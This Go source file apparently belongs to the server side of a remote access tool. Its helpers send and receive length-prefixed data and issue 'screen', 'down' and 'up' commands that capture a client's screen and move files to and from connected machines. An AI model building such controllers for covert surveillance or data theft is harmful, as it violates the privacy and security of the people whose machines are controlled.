package server

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"path/filepath"
)

const buffsize = 4096

func (c *activeClient) recv() ([]byte, error) {
	var size int64
	err := binary.Read(c.Conn, binary.LittleEndian, &size)
	if err != nil {
		fmt.Println("err:", err)
		return nil, err
	}
	var fullbuff []byte
	for {
		buff := make([]byte, buffsize)
		if size < buffsize {
			buff = make([]byte, size)
		}
		int, err := c.Conn.Read(buff)
		if err != nil {
			return nil, err
		}
		fullbuff = append(fullbuff, buff[:int]...)
		size -= int64(int)
		if size == 0 {
			break
		}
	}
	return fullbuff, nil
}

func (c *activeClient) recvSt() (string, error) {
	recv, err := c.recv()
	if err != nil {
		return "", err
	}
	return string(recv), nil
}

func (c *activeClient) send(data []byte) error {
	size := len(data)
	err := binary.Write(c.Conn, binary.LittleEndian, int64(size))
	if err != nil {
		fmt.Println("err:", err)
		return err

	}
	_, err = c.Conn.Write(data)
	return err

}

func (c *activeClient) sendSt(cmdout string) error {
	return c.send([]byte(cmdout))
}

func (c *activeClient) getFile(filename string) error {
	if filename == "screen" {
		c.sendSt("screen")
		filename = getTimeSt() + ".png"
	} else {
		c.sendSt("down " + filename)
	}
	data, err := c.recv()
	if err != nil {
		return err
	}
	if string(data) == "err" {
		return errors.New("[!] File does not exist or permission denied")
	}
	path := filepath.Join(c.Client.Path, filename)
	err = ioutil.WriteFile(path, data, 0666)
	if err != nil {
		return err
	}
	return nil
}

func (c *activeClient) sendFile(filename string) error {
	c.sendSt("up " + filename)
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return err
	}
	err = c.send(content)
	if err != nil {
		return err
	}
	return nil
}
